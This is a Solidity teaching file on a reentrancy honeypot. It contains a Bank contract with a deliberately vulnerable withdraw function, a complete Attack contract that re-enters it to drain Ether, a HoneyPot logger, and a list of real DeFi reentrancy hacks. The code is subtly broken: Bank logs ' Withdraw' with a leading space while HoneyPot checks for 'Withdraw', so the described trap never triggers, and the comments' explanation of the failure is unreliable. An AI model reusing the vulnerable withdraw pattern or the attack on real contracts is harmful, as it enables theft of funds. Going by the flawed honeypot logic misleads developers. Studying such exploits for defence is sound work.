//SPDX-License-Identifier: UNLICENSED

/*
    Author: Ankit Mishra
    Bank is a contract that calls Logger to log events.
    Bank.withdraw() is vulnerable to the reentrancy attack.
    So a hacker tries to drain Ether from Bank.
    But actually the reentracy exploit is a bait for hackers.
    By deploying Bank with HoneyPot in place of the Logger, this contract becomes
    a trap for hackers. Let's see how.

    1. Alice deploys HoneyPot
    2. Alice deploys Bank with the address of HoneyPot
    3. Alice deposits 1 Ether into Bank.
    4. Eve discovers the reentrancy exploit in Bank.withdraw and decides to hack it.
    5. Eve deploys Attack with the address of Bank
    6. Eve calls Attack.attack() with 1 Ether but the transaction fails.

    What happened?
    Eve calls Attack.attack() and it starts withdrawing Ether from Bank.
    When the last Bank.withdraw() is about to complete, it calls logger.log().
    Logger.log() calls HoneyPot.log() and reverts. Transaction fails.
*/
pragma solidity ^0.8.0;



contract Bank{
    mapping(address => uint) public balances;
    Logger logger;

    constructor (Logger _logger){
        logger = Logger(_logger);
    }

    function deposit() public payable{
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }

    function withdraw(uint _amount) public{
        require(_amount <= balances[msg.sender], " Insufficient Funds");

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, " Failed to send Ether");

        balances[msg.sender] -= _amount;
        logger.log(msg.sender, _amount, " Withdraw");
    }
}

contract Logger{
    event Log(address caller, uint amount, string action);

    function log(
        address _caller,
        uint _amount,
        string memory _action
    ) public {
        emit Log(_caller, _amount, _action);
    }
}

// Hacker tries to steal the ether stored in Bank by using reentrancy(Technique Used in 2016 Ethereum DAO Hack)

contract Attack{
    Bank bank;

    constructor(Bank _bank){
        bank = Bank(_bank);
    }

    fallback() external payable{
        if(address(bank).balance >= 1 ether){
            bank.withdraw(1 ether);
        }
    }

    receive() external payable{

    }

    function attack() public payable{
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}

// Let's say this code is in a separate file so that others cannot read it.
contract HoneyPot{
    function log(
        address _caller,
        uint _amount,
        string memory _action
    ) public {
        if(equal(_action, "Withdraw")) {
            revert("It is a Trap");
        }
    }

    // Function to compare strings using keccak256
    function equal(string memory _a, string memory _b) public pure returns(bool){
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }
}

/*
Some examples of recent DeFi hacks that involved re-entrancy vulnerabilities include:

    Fei Protocol: In April 2022, the Fei protocol was the victim of an ~$80 million hack
     that was made possible by its use of third-party code containing re-entrancy vulnerabilities.
    Paraluni: A March 2022 hack of the Paraluni smart contract exploited a re-entrancy vulnerability
     and poor validation of untrusted user input to steal ~$1.7 million in tokens.
    Grim Finance: In December 2021, a re-entrancy vulnerability in Grim Finance’s
     safeTransferFrom function was exploited for ~$30 million in tokens.
    SIREN Protocol: A re-entrancy vulnerability in the SIREN protocol’s AMM pool smart contracts
     was exploited in September 2021 for ~$3.5 million in tokens.
    CREAM Finance: In August 2021, an attacker took advantage of a re-entrancy vulnerability
     in CREAM Finance’s integration of AMP tokens to steal approximately $18.8 million in tokens.

*/